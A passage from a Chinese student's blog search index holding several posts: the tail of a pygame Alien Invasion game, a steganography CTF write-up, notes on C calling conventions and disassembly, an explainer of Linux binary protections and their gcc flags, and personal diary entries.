class="built_in">range</span>(number_rows):</span><br><span class="line">            <span class="keyword">for</span> alien_number <span class="keyword">in</span> <span class="built_in">range</span>(number_aliens_x):</span><br><span class="line">                self._create_alien(alien_number, row_number)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;创建外星人并将其放置在行中&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_create_alien</span>(<span class="params">self, alien_number, row_number</span>):</span></span><br><span class="line">        alien = Alien(self)</span><br><span class="line">        alien_width, alien_height = alien.rect.size</span><br><span class="line">        alien.x = alien_width + <span class="number">2</span> * alien_width * alien_number</span><br><span class="line">        alien.rect.x = alien.x</span><br><span class="line">        alien.rect.y = alien.rect.height + <span class="number">2</span> * alien.rect.height * row_number</span><br><span class="line">        self.aliens.add(alien)</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;如果有任何外星人到达边缘，请做出适当的反应&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_check_fleet_edges</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">for</span> alien <span class="keyword">in</span> self.aliens.sprites():</span><br><span class="line">            <span class="keyword">if</span> alien.check_edges():</span><br><span class="line">                self._change_fleet_direction()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_change_fleet_direction</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;放下整个舰队并更改舰队的方向.&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> alien <span class="keyword">in</span> self.aliens.sprites():</span><br><span class="line">            alien.rect.y += self.settings.fleet_drop_speed</span><br><span class="line">        self.settings.fleet_direction *= -<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;更新屏幕上的图像，然后切换到新屏幕&quot;&quot;&quot;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_update_screen</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Update images on the screen, and flip to the new screen.&quot;&quot;&quot;</span></span><br><span class="line">        self.screen.fill(self.settings.bg_color)</span><br><span class="line">        self.ship.blitme()</span><br><span class="line">        <span class="keyword">for</span> bullet <span class="keyword">in</span> self.bullets.sprites():</span><br><span class="line">            bullet.draw_bullet()</span><br><span class="line">        self.aliens.draw(self.screen)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 绘制分数信息.</span></span><br><span class="line">        self.sb.show_score()</span><br><span class="line"></span><br><span class="line">        <span class="comment">#如果游戏处于非活动状态，请绘制播放按钮.</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.stats.game_active:</span><br><span class="line">            self.play_button.draw_button()</span><br><span class="line"></span><br><span class="line">        pygame.display.flip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 运行游戏</span></span><br><span class="line">    ai = AlienInvasion()</span><br><span class="line">    ai.run_game()</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在设计时是需要不断对每个模块进行重构，重构的目的一是为了使代码看起来更简洁，而是优化代码，减少不必要的代码。除此之外，还需要对项目进行不断检查，检查是否有bug，对bug要进行即使修改。还有，python虽然使用起来非常方便，但是需要记住的函数却很多，要熟练的使用，必须要能够熟悉相关的第三方库，这样才能做到游刃有余。</p>]]></content>
      
      
      <categories>
          
          <category> 心得 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蓝帽杯MISC</title>
      <link href="/post/%E8%93%9D%E5%B8%BD%E6%9D%AFMISC.html"/>
      <url>/post/%E8%93%9D%E5%B8%BD%E6%9D%AFMISC.html</url>
      
        <content type="html"><![CDATA[<h1 id="冰墩墩"><a href="#冰墩墩" class="headerlink" title="冰墩墩"></a>冰墩墩</h1><p>拿到附件拖进虚拟机中使用binwalk查看</p><p><img src="https://i.loli.net/2021/05/05/Fpan5DGMyYfHrZx.png" alt="图片1.png"></p><p>发现里面存在rar压缩包，使用foremost进行分离</p><p><img src="https://i.loli.net/2021/05/05/v8i7wY6kUMNRXxA.png" alt="图片2.png"></p><p><img src="https://i.loli.net/2021/05/05/WgwaT4hGJ9FlHYU.png" alt="图片3.png"></p><p>发现音频和提示<img src="https://i.loli.net/2021/05/05/hxJzEVyRfQGDrFo.png" alt="图片4.png"></p><p>将音频放进010，在结尾发现cipher<img src="https://i.loli.net/2021/05/06/ubNWz2AeCUgl7X8.png" alt="图片5.png"></p><p>将对应的十六进制码复制下来，搜索以0~F编码的加密方式，发现是url编码。<img src="https://i.loli.net/2021/05/05/Aj62JcfVHiRQXdl.png" alt="图片6.png"></p><p>对十六进制码进行处理<img src="https://i.loli.net/2021/05/05/IV5ekvFXmoO4R2d.png" alt="图片7.png"></p><p>解码后发现是一堆表情包<img src="https://i.loli.net/2021/05/05/MxWecuYztbjRVHk.png" alt="图片9.png"></p><p>对表情包进行解码发现无法翻译，搜索了一下发现可能是emoji-aes加密，但缺少密匙，之后回去在看mp3文件，想到misc里面有一个MP3stego的工具，但是还需要一个密码才有行，想到之前的eight numbers，加上题目名称，猜测可能是冬奥会举办日期20220204<img src="https://i.loli.net/2021/05/06/Ru2JVmP3pL4vnIl.png" alt="图片11.png"></p><p>得到一个txt文件，发现是python里面的一种编码方式<img src="https://i.loli.net/2021/05/06/zK19G53w4ZsJfBQ.png" alt="图片13.png"></p><p>发现是wingdings图标，在线解码，得到密匙How_6ad_c0uld_a_1cePeak_be?   之后进行emoji-aes解码得到flag<img src="https://i.loli.net/2021/05/06/Yeg6xybJDlq4GrQ.png" alt="图片15.png"></p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> write up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言函数调用与常见调用约定</title>
      <link href="/post/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%B8%8E%E5%B8%B8%E8%A7%81%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A.html"/>
      <url>/post/C%E8%AF%AD%E8%A8%80%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E4%B8%8E%E5%B8%B8%E8%A7%81%E8%B0%83%E7%94%A8%E7%BA%A6%E5%AE%9A.html</url>
      
        <content type="html"><![CDATA[<h1 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h1><p>下面代码展示了一个简单的加法子函数调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">plus</span> <span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c;</span><br><span class="line">    c=plus(a,b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入反汇编查看</p><p><img src="https://i.loli.net/2021/05/05/WinHfG98h6gNzVs.png" alt="image-20210425221051251.png"></p><p>首先，系统会将1，2分别移动到a，b对应的地址中，之后从右至左将b，a对应地址的值移动到eax，ecx中，之后进行跳转到plus函数的plt表</p><p><img src="https://i.loli.net/2021/05/05/fkHsWxKLNU9uXBb.png" alt="image-20210425221706739.png"></p><p>再跳转到plus函数的实际中</p><p><img src="https://i.loli.net/2021/05/05/K1Qb8IYfksJ6lUd.png" alt="image-20210425221830540.png"></p><p>子函数先是把ebp保存在栈中，之后通过mov指令将ebp指向esp指向的位置，esp再进行抬栈处理，然后保存现场（将ebx，esi，edi存储的值保存在堆栈中）,接下来把ebp-0ch对应的地址移动到edi中。之后向ecx赋30h，向eax赋0CCCCCCCCh，然后对es:edi对应的地址开始循环赋值（整个过程就是对缓冲区初始化）。（后面两个不知道是什么，太菜了😅）</p><p>补：缓冲区用于存储函数调用里面申请的变量，因为这些变量存放在缓冲区，当调用完成后缓冲区会被丢弃，所以函数调用里面的变量无法被函数外面访问到</p><p><img src="https://i.loli.net/2021/05/05/A2XJYcVMrRgTzaP.png" alt="image-20210426075548516.png"></p><p>接下来就是将a的值移动到eax中再加b的值，后面再恢复现场，再内平栈（add esp 0C0h）,之后比较esp，ebp是否相同，（如果相同我也不知道会怎么样，😅），然后将esp指向ebp指向的位置，将ebp返回到原来的地方。</p><p><img src="https://i.loli.net/2021/05/05/Cc6jF9qiHUAKoG7.png" alt="image-20210425222327010.png"></p><p>最后外平栈（add esp,8），将计算结果从eax移到变量c对应的地址中，至此完成函数调用</p><p><img src="https://i.loli.net/2021/05/05/CAj5SFWvYikT38l.png" alt="image-20210426075951991.png"></p><h1 id="常见的三种调用约定（32位）"><a href="#常见的三种调用约定（32位）" class="headerlink" title="常见的三种调用约定（32位）"></a>常见的三种调用约定（32位）</h1><p><img src="https://i.loli.net/2021/05/05/vaOVrxQuMnZfL4F.png" alt="image-20210426080234751.png"></p><p>第一种就是系统默认的调用约定，调用者清理栈，就是和上面外平栈（add esp,8）差不多</p><p>第二种就是在返回时对ret进行处理，使栈指针指向调用参数前的地址（如：ret 8）</p><p>第三种就是通过寄存器传参，但如果寄存器不够还是得借助栈来传参，因为cpu与寄存器之间传递相对于cpu与内存更快，所以第三种方法在参数较少时，更加高效。</p>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 收获 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux常见的保护机制</title>
      <link href="/post/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E2%BD%A4%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.html"/>
      <url>/post/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E2%BD%A4%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6.html</url>
      
        <content type="html"><![CDATA[<h1 id="checksec（gdb安装好就有）"><a href="#checksec（gdb安装好就有）" class="headerlink" title="checksec（gdb安装好就有）"></a>checksec（gdb安装好就有）</h1><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><p>动态调试软件，必备。</p><p>安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gdb</span><br></pre></td></tr></table></figure><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>作用：它是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。</p><p>用法：checksec filename</p><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec start</span><br><span class="line">CANARY    : disabled(这个选项表示栈保护功能有没有开启。)</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br></pre></td></tr></table></figure><h1 id="CANNARY-栈保护"><a href="#CANNARY-栈保护" class="headerlink" title="CANNARY(栈保护)"></a>CANNARY(栈保护)</h1><p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈中高危区插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。**</p><p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p><p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -o test test.c  &#x2F;&#x2F;禁用栈保护</span><br><span class="line">gcc -fstack-protector -o test test.c   &#x2F;&#x2F;启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span><br><span class="line">gcc -fstack-protector-all -o test test.c &#x2F;&#x2F;启用堆栈保护，为所有函数插入保护代码</span><br></pre></td></tr></table></figure><h1 id="FORTIFY-轻微的检查"><a href="#FORTIFY-轻微的检查" class="headerlink" title="FORTIFY(轻微的检查)"></a>FORTIFY(轻微的检查)</h1><p>fority其实是非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memepy,stpcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf， vsprintf，vsnprintf, gets以及宽字符的变体。FORTIFY_ SOURCE设为1,并且将编译器设置为优化1(gcc -01)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; 默认情况下，不会开这个检查 </span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;1 -o test test.c &#x2F;&#x2F; 较弱的检查 </span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;1 仅仅只会在编译时进⾏检查 (特别像某些头⽂件 #include &lt;str _FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编 </span><br><span class="line">gcc -D_FORTIFY_SOURCE&#x3D;2 -o test test.c &#x2F;&#x2F; 较强的检查 gcc -D_FORTIFY_SOURCE&#x3D;2 程序执⾏时也会有检查 (如果检查到缓冲区溢出，就终⽌程序) _FORTIFY_SOURCE设为2，有些检查功能会加⼊，但是这可能导致程序崩溃。</span><br></pre></td></tr></table></figure><h1 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h1><p>NX（ DEP）的基本原理是将数据所在内存⻚标识为不可执⾏,当程序溢出成功转⼊shellcode时，程序会尝试在数据⻚⾯上执⾏指令，此时CPU就会抛出异常 ,⽽不是去执⾏恶意指令 。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; 默认情况下，开启NX保护</span><br><span class="line">gcc -z execstack -o test test.c &#x2F;&#x2F; 禁⽤NX保护 </span><br><span class="line">gcc -z noexecstack -o test test.c &#x2F;&#x2F; 开启NX保护</span><br></pre></td></tr></table></figure><p>在Windows下，类似的概念为DEP（数据执行保护）,数据执⾏保护( D E P ) （ Data Execution Prevention ） 是⼀套软硬件技术，能 够 在 内 存上执⾏额外检查以帮助防⽌在系统上运⾏恶意代码 ,在最新版的Visual Studio中默认开启了DEP编译选项。</p><h1 id="PIE（ASLR）"><a href="#PIE（ASLR）" class="headerlink" title="PIE（ASLR）"></a>PIE（ASLR）</h1><p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。PIE和ASLR不是一样的作用，ASLR只能对堆、栈,ibc和mmap随机化，而不能对代码段，数据段随机化，使用PIE+ASLR则可以对代码段和数据段随机化。区别是ASLR是系统功能选项，PIE和PIC是编译器功能选项。联系点在于在开启ASLR之后，PIE才会生效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">gcc -o test test.c &#x2F;&#x2F; 默认情况下，不开启PIE </span><br><span class="line">gcc -fpie -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时强度为1 </span><br><span class="line">gcc -fPIE -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时为最⾼强度2 </span><br><span class="line">gcc -fpic -o test test.c &#x2F;&#x2F; 开启PIC，此时强度为1，不会开启PIE</span><br><span class="line">gcc -fPIC -o test test.c &#x2F;&#x2F; 开启PIC，此时为最⾼强度2，不会开启PIE</span><br></pre></td></tr></table></figure><h1 id="ASLR-Address-Space-Layout-Randomization"><a href="#ASLR-Address-Space-Layout-Randomization" class="headerlink" title="ASLR (Address Space Layout Randomization)"></a>ASLR (Address Space Layout Randomization)</h1><p>ASLR是⼀种针对缓冲区溢出的安全保护技术,通过对堆栈 、共享库映射等线性区布局的随机化，通过增加攻击者预测⽬的地址的难度,防⽌攻击者直接定位攻击代码位置,达到阻⽌溢出攻击的⽬的。 </p><p>参考文章：<a href="https://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>快乐周五</title>
      <link href="/post/tuoli.html"/>
      <url>/post/tuoli.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>这是这几个月最值得纪念的周五，体验了脱离学校的快乐</p></blockquote><p>2020.12.13</p><p>  晚上和社团其它人一起谋划着“出校大计”，原本定在周六，但是由于学校要体测（挺佩服学校挑时间的能力🤬），不得不将时间改成周五，让快乐减少了一半😔</p><p>2020.12.15</p><p>  果然到了周末就会发现屁事很多😔，一个个周末都有事，只剩几个大男人可以出去，这次出校也变成了“罗汉出行”，照这样下去，不知道之后几天会发生什么😱</p><p>2020.12.17</p><p>  原本课上得好好的，突然一个朋友说周六体测取消了，改了时间，我直接当场爆炸🤬，没办法假条都上交了，时间也不能修改，只能认命</p><p>2020.12.18</p><p>  原本计划好的五个人，要走的时候最后一个人掉链子😔，最后变成四罗汉出行。</p><p>开始打算看电影，但是觉得没什么好看的电影加上时间不够，所以改成了密室逃脱（补充一下，有个当地人带路非常重要😃）</p><img src="/images/17.jpg" height="400" width="350" /><img src="/images/16.jpg" height="400" width="350" /><img src="/images/15.jpg" height="400" width="350" /><p>游戏体验还不错（除了那个怕鬼的师兄），还送了一个纪念品（下面的是买奶茶送的纪念品）😃</p><img src="/images/20.jpg" height="400" width="350" /><p>最后去吃了碗拉面，味道还是相当不错的，就是价格有点小贵/(ㄒoㄒ)/~~</p><p>饭后去逛了一下，带点东西给室友，最后打的回校</p><img src="/images/19.jpg" height="400" width="350" /><p>  这次行程还是不错的（比呆在学校好多了），发现南昌还是蛮好玩的，但就是不知道下次出去是什么时候了😔</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 娱乐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的第一篇文章</title>
      <link href="/post/My-First-Post.html"/>
      <url>/post/My-First-Post.html</url>
      
        <content type="html"><![CDATA[<h2 id="新的开始"><a href="#新的开始" class="headerlink" title="新的开始"></a>新的开始</h2><p><em>这是本人第一次搭博客，走了许多弯路，经过了无数次的失败，浪费了大量的时间，但最终还是搭建完成。在这其中，我请教了石师兄和高师兄，借鉴了B站的视频，才最终成功。最后，我希望迈出这一小步后能够继续向前，并成为我想成为的人。</em></p><span id="more"></span><h3 id="音频测试"><a href="#音频测试" class="headerlink" title="音频测试"></a>音频测试</h3><h4 id="照片"><a href="#照片" class="headerlink" title="照片"></a>照片</h4><img src="/images/1.jpg" height="400" width="350" /><h4 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h4><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=400 height=86 src="//music.163.com/outchain/player?type=2&id=1477539203&auto=1&height=66"></iframe><h4 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h4><video src='/video/1.mp4' heigth='500px' controls>]]></content>
      
      
      <categories>
          
          <category> 心得 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 感想 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
